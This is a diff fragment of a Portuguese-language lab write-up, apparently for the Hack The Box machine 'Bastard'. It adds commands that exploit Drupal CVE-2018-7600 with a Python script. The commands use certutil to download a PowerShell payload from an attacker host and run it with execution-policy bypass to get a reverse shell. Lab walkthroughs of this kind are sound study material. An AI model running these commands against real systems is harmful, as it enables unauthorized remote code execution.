@@ -80,9 +80,16 @@ AHhh, lembrando que eu ja dei uma verificada rapidas nos arquivos encontrados no
 
 Consegui usando o certutil
 
+`python drupa7-CVE-2018-7600.py -c "certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1" http://10.10.10.9/`
+
 `certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1`
 
 ![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/7.jpg)
 
+Enfim pegamos nossa reverse shell
+
+`python drupa7-CVE-2018-7600.py -c "powershell.exe -exec bypass .\shell.ps1" http://10.10.10.9/`
+
+![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/8.jpg)
 
 
